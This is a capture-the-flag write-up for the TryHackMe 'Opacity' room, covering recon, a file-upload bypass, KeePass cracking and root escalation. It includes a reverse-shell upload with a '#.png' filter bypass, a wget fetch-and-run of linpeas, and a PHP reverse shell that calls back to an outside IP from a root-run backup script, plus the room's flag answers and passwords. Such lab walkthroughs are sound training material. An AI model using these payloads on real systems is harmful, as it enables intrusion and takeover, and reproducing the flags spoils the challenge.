# <div align="center">[Opacity TryHackMe walkthrough](https://tryhackme.com/room/opacity)</div>
<div align="center">Opacity is a Boot2Root made for pentesters and cybersecurity enthusiasts.</div>
<div align="center">
  <img width="200" height="200" alt="Opacity-thm" src="https://github.com/user-attachments/assets/afa6e290-e01f-4b51-b358-461a1e94ee0c" />  
</div>

## Task 1. Opacity

Opacity is an easy machine that can help you in the penetration testing learning process.

There are 2 hash keys located on the machine (user - local.txt and root - proof.txt). Can you find them and become root?

#### What is the  local.txt flag?
```
6661b61b44d234d230d06bf5b3c075e2
```
#### What is the proof.txt flag?
```
ac0d56f93202dd57dcb2498c739fd20e
```
---
# Introduction
Opacity is an easy-level [TryHackMe](https://tryhackme.com/dashboard) room designed to build foundational penetration testing skills through practical, hands-on exploitation. The goal is to retrieve two flags, local.txt and proof.txt, by fully compromising the system.

* Room link: https://tryhackme.com/room/opacity
---
## Initial Reconnaissance

I kicked things off with a quick version scan using Nmap to identify exposed services on the target host.

```
$ nmap -sV 10.49.167.120

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan confirmed the host was reachable and exposed a small but interesting attack surface:

• SSH running on port `22`
• Apache web server exposed on port `80`
• SMB services available on ports `139` and `445`

With HTTP in play, the browser became the next obvious stop.
---

### Web Enumeration

Visiting the web service on port 80 landed me on a login page.

<img width="1144" height="240" alt="image" src="https://github.com/user-attachments/assets/a15b6f5a-c77e-476f-b7d8-217132592cd5" />

I tested a couple of default credentials just to rule out the obvious, but nothing clicked. Instead of burning cycles there, I shifted focus to directory enumeration to see what else the web server was willing to expose.

```
~$ dirsearch -u 10.49.167.120

Target: http://10.49.167.120/

[22:26:42] Starting: 
[22:26:46] 403 -  278B  - /.ht_wsr.txt
[22:26:46] 403 -  278B  - /.htaccess.sample
[22:26:46] 403 -  278B  - /.htaccess_extra
[22:26:46] 403 -  278B  - /.htaccess_orig
[22:26:46] 403 -  278B  - /.htaccess.bak1
[22:26:46] 403 -  278B  - /.htaccess_sc
[22:26:46] 403 -  278B  - /.htaccess.save
[22:26:46] 403 -  278B  - /.htaccess.orig
[22:26:46] 403 -  278B  - /.htaccessOLD2
[22:26:46] 403 -  278B  - /.html
[22:26:46] 403 -  278B  - /.htm
[22:26:46] 403 -  278B  - /.htaccessOLD
[22:26:46] 403 -  278B  - /.htaccessBAK
[22:26:46] 403 -  278B  - /.httr-oauth
[22:26:46] 403 -  278B  - /.htpasswd_test
[22:26:46] 403 -  278B  - /.htpasswds
[22:26:47] 403 -  278B  - /.php
[22:26:57] 301 -  314B  - /cloud  ->  http://10.49.167.120/cloud/
[22:26:57] 200 -  393B  - /cloud/
[22:26:59] 301 -  312B  - /css  ->  http://10.49.167.120/css/
[22:27:05] 200 -  381B  - /login.php
[22:27:13] 403 -  278B  - /server-status
[22:27:13] 403 -  278B  - /server-status/

Task Completed
```

The scan returned multiple forbidden paths and a handful of valid responses. One directory stood out immediately: `/cloud`. That was worth a closer look.

```
~$ dirsearch -u 10.49.167.120/cloud

Target: http://10.49.167.120/

[22:30:31] Starting: cloud/
[22:30:33] 403 -  278B  - /cloud/.ht_wsr.txt
[22:30:33] 403 -  278B  - /cloud/.htaccess.orig
[22:30:33] 403 -  278B  - /cloud/.htaccess.save
[22:30:33] 403 -  278B  - /cloud/.htaccess.bak1
[22:30:33] 403 -  278B  - /cloud/.htaccess_extra
[22:30:33] 403 -  278B  - /cloud/.htaccess_sc
[22:30:33] 403 -  278B  - /cloud/.htaccessBAK
[22:30:33] 403 -  278B  - /cloud/.htaccess_orig
[22:30:33] 403 -  278B  - /cloud/.htaccess.sample
[22:30:33] 403 -  278B  - /cloud/.htaccessOLD
[22:30:33] 403 -  278B  - /cloud/.htm
[22:30:33] 403 -  278B  - /cloud/.htpasswd_test
[22:30:33] 403 -  278B  - /cloud/.html
[22:30:33] 403 -  278B  - /cloud/.htaccessOLD2
[22:30:33] 403 -  278B  - /cloud/.htpasswds
[22:30:33] 403 -  278B  - /cloud/.httr-oauth
[22:30:33] 403 -  278B  - /cloud/.php
[22:30:51] 301 -  321B  - /cloud/images  ->  http://10.49.167.120/cloud/images/
[22:30:52] 200 -  400B  - /cloud/index.php
[22:30:52] 200 -  404B  - /cloud/index.php/login/

Task Completed
```

This second pass revealed additional endpoints, including `/cloud/index.php` and a nested login path. Navigating to the cloud endpoint in the browser brought up a new interface.

<img width="747" height="483" alt="image" src="https://github.com/user-attachments/assets/f849877b-d9e7-4c1e-b256-a4adacc6ec78" />

The page introduced itself as a personal cloud storage service with a time-limited file upload feature, which clearly marked it as a component worth paying close attention to moving forward.

### Exploitation

After a bit of trial and error, I noticed the upload feature only allowed `.jpg` or `.png` files, but the application still fetched files hosted from my machine, which opened a path to bypass the restriction using a renamed PHP file.

To take advantage of this, I used the Pentest Monkey PHP reverse shell.

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
cd php-reverse-shell
```

I edited the reverse shell and updated the IP address and port to match my VPN listener.

```
nano php-reverse-shell.php
```

<img>

For convenience, I made a shorter copy of the file.

```
cp php-reverse-shell.php shell.php
```

---

### Gaining Access

I started a Python HTTP server to host the payload.

```
python3 -m http.server 8000
```

In another terminal, I set up a Netcat listener.

```
rlwrap nc -lnvp 8000
```

With everything ready, I uploaded the payload by appending a fake image extension to bypass the filter.

```
http://<your-ip>:8000/shell.php#.png
```

<img width="761" height="463" alt="image of upload" src="https://github.com/user-attachments/assets/b538a71c-471c-4346-89d0-2f5a546ca63b" />

The upload went through successfully.

<img width="778" height="338" alt="image link " src="https://github.com/user-attachments/assets/79bcf5ac-f11f-407e-87fa-fd5c6bb837af" />

The application returned a link to the uploaded file, which I invoked directly.

```
curl http://10.49.167.120/cloud/images/shell.php#.png
```

That immediately triggered a reverse connection.

<img width="684" height="209" alt="shell" src="https://github.com/user-attachments/assets/da76eabf-0443-4441-b2ca-2f37892f1c85" />

At this point, I had an active shell as the `www-data` user.

### Capturing the User Flag (local.txt)

Once I had a shell, I shifted focus to identifying valid local users on the system.

• Enumerated users from `/etc/passwd` to spot interactive accounts

```
cat /etc/passwd | grep sh
```

• Identified two real users: `sysadmin` and `ubuntu`
• Checked the `ubuntu` home directory and found it empty
• Moved to the `sysadmin` home directory and confirmed the presence of `local.txt`
• Verified that the flag existed but was not readable with current permissions

```
$ ls -lah

total 44K
drwxr-xr-x 6 sysadmin sysadmin 4.0K Feb 22  2023 .
drwxr-xr-x 4 root     root     4.0K Jan  2 17:34 ..
-rw------- 1 sysadmin sysadmin   22 Feb 22  2023 .bash_history
-rw-r--r-- 1 sysadmin sysadmin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 sysadmin sysadmin 3.7K Feb 25  2020 .bashrc
drwx------ 2 sysadmin sysadmin 4.0K Jul 26  2022 .cache
drwx------ 3 sysadmin sysadmin 4.0K Jul 28  2022 .gnupg
-rw-r--r-- 1 sysadmin sysadmin  807 Feb 25  2020 .profile
drwx------ 2 sysadmin sysadmin 4.0K Jul 26  2022 .ssh
-rw-r--r-- 1 sysadmin sysadmin    0 Jul 28  2022 .sudo_as_admin_successful
-rw------- 1 sysadmin sysadmin   33 Jul 26  2022 local.txt
drwxr-xr-x 3 root     root     4.0K Jul  8  2022 scripts
```

At this point, manual poking didn’t make sense, so I pivoted to local enumeration.

---

### Privilege Enumeration with LinPEAS

Instead of wasting time, I pulled `linpeas.sh` to enumerate the system properly.

• Downloaded [linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/download/20260101-f70f6a79/linpeas.sh) on my machine
• Hosted it using a Python HTTP server

```
python3 -m http.server 8000
```

• Downloaded and executed it on the target

```
cd /dev/shm
wget http://<your-ip>:8000/linpeas.sh
bash linpeas.sh
```

• LinPEAS highlighted an interesting KeePass database file owned by `sysadmin`

```
/opt/dataset.kdbx
```

<img width="696" height="88" alt="image" src="https://github.com/user-attachments/assets/a06125bf-d4bf-44b4-90b3-98bddae61a19" />

That file was the clear pivot point.

---

### Extracting and Cracking the KeePass Database

To work with the file locally, I transferred it back to my system.

• Started a Python server on the target

```
python3 -m http.server 8000
```

• Pulled the database file to my machine

```
wget http://10.49.167.120:8000/dataset.kdbx
```

• Used John the Ripper to extract and crack the KeePass hash

```
sudo apt update
sudo apt install -y \
build-essential git libssl-dev zlib1g-dev \
libbz2-dev libgmp-dev libpcap-dev pkg-config \
libnss3-dev libkrb5-dev libopenmpi-dev \
yasm

git clone https://github.com/openwall/john.git
cd john/src

./configure
make -j$(nproc)

cd ~/john/run
./keepass2john /home/$USER/dataset.kdbx > hash.txt
./john hash.txt
```

<img width="962" height="484" alt="img of cracking pass" src="https://github.com/user-attachments/assets/ecc13194-b5ce-4cc0-87e9-d2f09300e31f" />

• Installed KeePassXC and opened the database using the recovered password

```
keepassxc dataset.kdbx
# pass: 741852963
```

<img width="804" height="630" alt="image of db" src="https://github.com/user-attachments/assets/71167515-dc71-47e3-b36b-b086516245f5" />

The database contained credentials that immediately changed the game.

---

### SSH Access and User Flag

Using the credentials retrieved from the KeePass file, I logged in via SSH as `sysadmin`.

```
ssh sysadmin@ip
# pass: Cl0udP4ss40p4city#8700
```

• Successful login confirmed
• Accessed the home directory
• Read the `local.txt` flag

<img width="439" height="67" alt="image" src="https://github.com/user-attachments/assets/60ba1c10-1032-45db-9ab9-7ca71d03f874" />

```
6661b61b44d234d230d06bf5b3c075e2
```

### Privilege Escalation to Root

With user access secured, I moved on to reviewing scheduled or automated scripts owned by higher-privileged users.

• Found a PHP script inside the `scripts` directory
• Noticed it was calling `lib/backup.inc.php` to back up the scripts folder
• Observed that the backup logic executed with root privileges

```
cat script.php
```
<img width="847" height="393" alt="image" src="https://github.com/user-attachments/assets/19477838-96ff-4473-82c8-d5f02f0d7fbf" />

Although the main script wasn’t writable, the included file immediately stood out.

• Checked permissions on the `lib` directory
• Confirmed `backup.inc.php` was owned by root

```
ls -la lib/
```

Despite the ownership, the file could be replaced indirectly.

---

### Abusing the Backup Script

To prepare for escalation, I first set up a listener on my machine.

```
nc -lnvp 4444
```

Next, I replaced the backup file with a malicious version.

• Moved the original file out of the way
• Copied it back into place under my control
• Navigated to the target directory

```
mv backup.inc.php /tmp
cp /tmp/backup.inc.php ~/scripts/lib/backup.inc.php
cd ~/scripts/lib/
```

I then overwrote `backup.inc.php` with a simple PHP reverse shell payload.

```
cat << 'EOF' > backup.inc.php
<?php
$sock=fsockopen("192.168.148.220",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
EOF
```

---

### Root Access

After a short wait, the scheduled task executed the modified script.

• Incoming connection received
• Shell spawned with root privileges

<img>
<img>

With root access confirmed, retrieving the final flag was straightforward.

```
ac0d56f93202dd57dcb2498c739fd20e
```

---

### Conclusion

Opacity was a solid lab that rewarded careful enumeration and patience rather than brute force. Each stage flowed naturally into the next, from web enumeration to file upload abuse, credential extraction, and finally a clean privilege escalation via a misconfigured backup script. It’s a great reminder that small oversights, when chained together, can lead to full system compromise.

**Thanks for reading.**
You can also find my walkthroughs on Medium: [https://medium.com/@deathesther](https://medium.com/@deathesther)

<img width="1076" height="606" alt="image" src="https://github.com/user-attachments/assets/de616619-961f-4b53-be31-aae4d86c7a1c" />
